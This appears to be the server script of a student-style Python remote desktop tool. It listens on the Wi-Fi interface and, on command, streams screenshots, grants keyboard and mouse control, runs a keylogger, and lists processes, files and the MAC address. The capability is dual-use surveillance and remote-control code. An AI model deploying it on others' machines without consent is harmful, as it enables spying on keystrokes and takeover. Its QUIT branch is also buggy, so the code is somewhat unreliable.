import socket
import tkinter as tk
import psutil

import RD_Screen as scr
import RD_Controlled as ctr
import RD_KeyLogger as log
import RD_ShutOut as sot
import RD_Mac as mac
import RD_TaskManager as tmr
import RD_Directory as dir

from RD_Constant import HOST, SERVER_PORT, FORMAT, BUFFERSIZE, DELAY

def screen_shot():
    screen_con, screen_addr = s.accept()
    scr.send_img(screen_con)
    return

def control():
    screen_con, screen_addr = s.accept()
    key_con, key_addr = s.accept()
    mouse_con, mouse_addr = s.accept()
    ctr.controlled(main_connection, screen_con, key_con, mouse_con)
    screen_con.close()
    key_con.close()
    mouse_con.close()
    return

def key_logger():
    log.keylog(main_connection)
    return

def shutout():
    sot.shutout(main_connection)
    return

def mac_address():
    mac.mac_addr(main_connection)
    return

def task_manager():
    tmr.task_manager(main_connection)
    return  

def directory_tree():
    dir.directory(main_connection)
    return

def get_wifi_ip_address():
    try:
        # Lặp qua tất cả các giao diện mạng
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                # Kiểm tra xem địa chỉ đó có phải là địa chỉ IP không
                if addr.family == socket.AF_INET and "Wi-Fi" in interface:
                    return addr.address
    except Exception as e:
        print(f"Error: {e}")
    return None
    
try:
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    IP = get_wifi_ip_address()
    print(IP)
    s.bind((IP, SERVER_PORT))
    s.listen(13)
    global com_con
    main_connection, main_addr = s.accept()
    while True:
        msg = main_connection.recv(BUFFERSIZE).decode(FORMAT)
        if "SCREENSHOT" in msg:
            screen_shot()
        elif "CONTROL" in msg:
            control()
        elif "SHUTOUT" in msg:
            shutout()
        elif "KEYLOG" in msg:
            key_logger()
        elif "TASK" in msg:
            task_manager()
        elif "MAC" in msg:
            mac_address()
        elif "DIRECTORY" in msg:
            directory_tree()
        elif "QUIT" in msg:
            main_connection.close()
            s.close()
            quit
except:
    print("Error in connection!")